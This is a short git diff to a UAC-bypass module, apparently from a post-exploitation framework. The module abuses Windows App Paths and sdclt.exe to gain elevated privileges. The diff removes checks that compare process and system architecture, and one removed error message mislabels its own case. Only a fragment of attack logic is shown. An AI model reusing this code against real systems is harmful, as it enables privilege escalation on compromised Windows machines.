@@ -43,15 +43,7 @@ class bypassuac():
         Performs an UAC bypass attack by using app Paths + sdclt.exe (Wind10 Only): Thanks to enigma0x3 (https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/).
         '''
         self.module.info('Running app Paths method for bypassing UAC...')
-        if '64' in self.module.client.desc['os_arch'] and '64' in self.module.client.desc['proc_arch']:
-            self.module.info('Current process: 64bits, System arch: 64bits, continue...')
-        elif '64' in self.module.client.desc['os_arch'] and '32' in self.module.client.desc['proc_arch']:
-            self.module.error('Current process: 64bits, System arch: 32bits, impossible to execute sdclt.exe in this configuration. ABORDING...')
-            self.module.error('You have to migrate to a 64 bits process before')
-            return
-        elif '32' in self.module.client.desc['os_arch'] and '32' in self.module.client.desc['proc_arch']:
-            self.module.info('Current process: 32bits, System arch: 32bits, continue...')
-        if '64' in self.module.client.desc['proc_arch']:
+        if '64' in self.module.client.desc['os_arch']:
             force_x86_dll = False
         else:
             force_x86_dll = True
